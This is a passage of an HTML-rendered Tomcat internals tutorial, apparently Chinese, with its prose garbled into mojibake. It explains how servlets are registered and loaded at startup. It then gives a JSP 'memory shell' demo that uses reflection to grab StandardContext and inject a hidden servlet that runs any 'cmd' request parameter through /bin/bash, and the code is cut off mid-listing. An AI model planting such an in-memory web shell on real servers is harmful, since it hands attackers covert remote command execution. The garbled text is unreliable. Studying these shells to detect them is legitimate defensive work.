class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>servletLearn1<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();</span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0ä»¥ä¸Šéœ€è¦åŠ è¿™è¡Œä»£ç ï¼Œå‚è€ƒï¼šhttps://blog.csdn.net/qq_42944840/article/details/116349603</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());</span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br><span class="line">        tomcat.start();</span><br><span class="line">        tomcat.getServer().await();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907002049554.png" alt="image-20250907002049554"></p><h3 id="servletåˆå§‹åŒ–æµç¨‹åˆ†æ"><a href="#servletåˆå§‹åŒ–æµç¨‹åˆ†æ" class="headerlink" title="servletåˆå§‹åŒ–æµç¨‹åˆ†æ"></a>servletåˆå§‹åŒ–æµç¨‹åˆ†æ</h3><p>æˆ‘ä»¬åœ¨<code>org.apache.catalina.core.StandardWrapper#setServletClass</code>å¤„ä¸‹æ–­ç‚¹è°ƒè¯•ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907002420597.png" alt="image-20250907002420597">ç„¶åå°±å¯ä»¥çœ‹åˆ°ï¼Œä¸Šå±‚è°ƒç”¨ä½ç½®ä½äº<code>org.apache.catalina.startup.ContextConfig#configureContext</code>ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907003102608.png" alt="image-20250907003102608"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¯¦ç»†çœ‹ä¸‹é¢è¿™æ®µä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç¬¬ä¸€ä¸ªå¾ªç¯ï¼šServlet å®šä¹‰æ³¨å†Œ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">    <span class="comment">// åˆ›å»º Servlet çš„åŒ…è£…å™¨ï¼ˆWrapper æ˜¯ Tomcat å¯¹ Servlet çš„è¿è¡Œæ—¶å°è£…ï¼‰</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¿½ç•¥æè¿°ã€æ˜¾ç¤ºåå’Œå›¾æ ‡ï¼ˆè¿™äº›æ˜¯ web.xml ä¸­çš„å¯é€‰å…ƒæ•°æ®ï¼‰</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¤„ç† load-on-startup</span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¤„ç†æ˜¯å¦å¯ç”¨</span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®¾ç½® Servlet åç§°ï¼ˆå¿…å¡«ï¼‰</span></span><br><span class="line">    wrapper.setName(servlet.getServletName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¤„ç†åˆå§‹åŒ–å‚æ•°ï¼ˆweb.xml ä¸­çš„ &lt;init-param&gt;ï¼‰</span></span><br><span class="line">    Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">        wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®¾ç½®è¿è¡Œèº«ä»½ï¼ˆRun-As è§’è‰²ï¼‰</span></span><br><span class="line">    wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¤„ç†å®‰å…¨è§’è‰²å¼•ç”¨ï¼ˆweb.xml ä¸­çš„ &lt;security-role-ref&gt;ï¼‰</span></span><br><span class="line">    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">    <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">        wrapper.addSecurityReference(roleRef.getName(), roleRef.getLink());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å…³é”®ç‚¹ï¼šè®¾ç½® Servlet ç±»åï¼ˆæˆ– JSP æ–‡ä»¶è·¯å¾„ï¼‰</span></span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¤„ç†æ–‡ä»¶ä¸Šä¼ é…ç½®ï¼ˆweb.xml ä¸­çš„ &lt;multipart-config&gt;ï¼‰</span></span><br><span class="line">    <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">    <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">            multipartdef.getLocation(),</span><br><span class="line">            maxFileSize,</span><br><span class="line">            maxRequestSize,</span><br><span class="line">            fileSizeThreshold</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¤„ç†å¼‚æ­¥æ”¯æŒï¼ˆweb.xml ä¸­çš„ &lt;async-supported&gt;ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setAsyncSupported(servlet.getAsyncSupported().booleanValue());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®¾ç½®æ˜¯å¦å…è®¸è¢«è¦†ç›–ï¼ˆé€šå¸¸ç”¨äºçƒ­éƒ¨ç½²ï¼‰</span></span><br><span class="line">    wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å°† Servlet åŒ…è£…å™¨æ·»åŠ åˆ° Context ä¸­</span></span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬äºŒä¸ªå¾ªç¯ï¼šURL æ˜ å°„æ³¨å†Œ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry :webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡<code>webxml.getServlets()</code>è·å–çš„æ‰€æœ‰<code>Servlet</code>å®šä¹‰ï¼Œå¹¶å»ºç«‹å¾ªç¯ï¼›ç„¶ååˆ›å»ºä¸€ä¸ª<code>Wrapper</code>å¯¹è±¡ï¼Œå¹¶è®¾ç½®<code>Servlet</code>çš„åŠ è½½é¡ºåºã€æ˜¯å¦å¯ç”¨ï¼ˆå³è·å–<code>&lt;/load-on-startup&gt;</code>æ ‡ç­¾çš„å€¼ï¼‰ã€<code>Servlet</code>çš„åç§°ç­‰åŸºæœ¬å±æ€§ï¼›æ¥ç€éå†<code>Servlet</code>çš„åˆå§‹åŒ–å‚æ•°å¹¶è®¾ç½®åˆ°<code>Wrapper</code>ä¸­ï¼Œå¹¶å¤„ç†å®‰å…¨è§’è‰²å¼•ç”¨ã€å°†è§’è‰²å’Œå¯¹åº”é“¾æ¥æ·»åŠ åˆ°<code>Wrapper</code>ä¸­ï¼›å¦‚æœ<code>Servlet</code>å®šä¹‰ä¸­åŒ…å«æ–‡ä»¶ä¸Šä¼ é…ç½®ï¼Œåˆ™æ ¹æ®é…ç½®ä¿¡æ¯è®¾ç½®<code>MultipartConfigElement</code>ï¼›è®¾ç½®<code>Servlet</code>æ˜¯å¦æ”¯æŒå¼‚æ­¥æ“ä½œï¼›é€šè¿‡<code>context.addChild(wrapper);</code>å°†é…ç½®å¥½çš„<code>Wrapper</code>æ·»åŠ åˆ°<code>Context</code>ä¸­ï¼Œå®Œæˆ<code>Servlet</code>çš„åˆå§‹åŒ–è¿‡ç¨‹ã€‚</p><p>ä¸Šé¢å¤§çš„<code>for</code>å¾ªç¯ä¸­åµŒå¥—çš„æœ€åä¸€ä¸ª<code>for</code>å¾ªç¯åˆ™è´Ÿè´£å¤„ç†<code>Servlet</code>çš„<code>url</code>æ˜ å°„ï¼Œå°†<code>Servlet</code>çš„<code>url</code>ä¸<code>Servlet</code>åç§°å…³è”èµ·æ¥ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>Servlet</code>çš„åˆå§‹åŒ–ä¸»è¦ç»å†ä»¥ä¸‹å…­ä¸ªæ­¥éª¤ï¼š</p><ul><li>åˆ›å»º<code>Wapper</code>å¯¹è±¡ï¼›</li><li>è®¾ç½®<code>Servlet</code>çš„<code>LoadOnStartUp</code>çš„å€¼ï¼›</li><li>è®¾ç½®<code>Servlet</code>çš„åç§°ï¼›</li><li>è®¾ç½®<code>Servlet</code>çš„<code>class</code>ï¼›</li><li>å°†é…ç½®å¥½çš„<code>Wrapper</code>æ·»åŠ åˆ°<code>Context</code>ä¸­ï¼›</li><li>å°†<code>url</code>å’Œ<code>servlet</code>ç±»åšæ˜ å°„</li></ul><h3 id="servletè£…è½½æµç¨‹åˆ†æ"><a href="#servletè£…è½½æµç¨‹åˆ†æ" class="headerlink" title="servletè£…è½½æµç¨‹åˆ†æ"></a>servletè£…è½½æµç¨‹åˆ†æ</h3><p>æˆ‘ä»¬åœ¨<code>org.apache.catalina.core.StandardWrapper#loadServlet</code>è¿™é‡Œæ‰“ä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•ï¼Œé‡ç‚¹å…³æ³¨<code>org.apache.catalina.core.StandardContext#startInternal</code>ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907004634614.png" alt="image-20250907004634614"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè£…è½½é¡ºåºä¸º<code>Listener</code>â€“&gt;<code>Filter</code>â€“&gt;<code>Servlet</code>ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907004440996.png" alt="image-20250907004440996"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢çš„ä»£ç éƒ½è°ƒç”¨äº†<code>org.apache.catalina.core.StandardContext#loadOnStartup</code>ï¼Œ<code>Ctrl+å·¦é”®</code>è·Ÿè¿›è¯¥æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">        map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper.load();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                getLogger().error(</span><br><span class="line">                        sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>, getName(), wrapper.getName()),</span><br><span class="line">                        StandardWrapper.getRootCause(e));</span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws</span></span><br><span class="line">                <span class="comment">// UnavailableException from the init() method) are NOT</span></span><br><span class="line">                <span class="comment">// fatal to application startup</span></span><br><span class="line">                <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                <span class="keyword">if</span> (getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ®µä»£ç å…ˆæ˜¯åˆ›å»ºä¸€ä¸ª<code>TreeMap</code>ï¼Œç„¶åéå†ä¼ å…¥çš„<code>Container</code>æ•°ç»„ï¼Œå°†æ¯ä¸ª<code>Servlet</code>çš„<code>loadOnStartup</code>å€¼ä½œä¸ºé”®ï¼Œå°†å¯¹åº”çš„<code>Wrapper</code>å¯¹è±¡å­˜å‚¨åœ¨ç›¸åº”çš„åˆ—è¡¨ä¸­ï¼›å¦‚æœè¿™ä¸ª<code>loadOnStartup</code>å€¼æ˜¯è´Ÿæ•°ï¼Œé™¤éä½ è¯·æ±‚è®¿é—®å®ƒï¼Œå¦åˆ™å°±ä¸ä¼šåŠ è½½ï¼›å¦‚æœæ˜¯éè´Ÿæ•°ï¼Œé‚£ä¹ˆå°±æŒ‰ç…§è¿™ä¸ª<code>loadOnStartup</code>çš„å‡åºçš„é¡ºåºæ¥åŠ è½½ã€‚</p><h2 id="Servlet-å†…å­˜é©¬"><a href="#Servlet-å†…å­˜é©¬" class="headerlink" title="Servlet å†…å­˜é©¬"></a>Servlet å†…å­˜é©¬</h2><h3 id="servlet-å†…å­˜é©¬demoç¼–å†™"><a href="#servlet-å†…å­˜é©¬demoç¼–å†™" class="headerlink" title="servlet å†…å­˜é©¬demoç¼–å†™"></a>servlet å†…å­˜é©¬demoç¼–å†™</h3><p>å¦‚æœæˆ‘ä»¬æƒ³è¦å†™ä¸€ä¸ªServletå†…å­˜é©¬ï¼Œéœ€è¦ç»è¿‡ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>æ‰¾åˆ°StandardContext</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„servlet</li><li>åˆ›å»ºWapperå¯¹è±¡</li><li>è®¾ç½®Servletçš„LoadOnStartUpçš„å€¼</li><li>è®¾ç½®Servletçš„Name</li><li>è®¾ç½®Servletå¯¹åº”çš„Class</li><li>å°†Servletæ·»åŠ åˆ°contextçš„childrenä¸­</li><li>å°†urlè·¯å¾„å’Œservletç±»åšæ˜ å°„</li></ol><p>å†™ä¸€ä¸ªç®€å•çš„demoï¼Œæ³¨æ„é»˜è®¤Macä¸­è¿è¡Œï¼Œå°†servlet.jspæ”¾å…¥Webç›®å½•ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.Servlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletURL</span> <span class="operator">=</span> <span class="string">&quot;/&quot;</span> + getRandomString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;Servlet&quot;</span> + getRandomString();</span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;&#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span 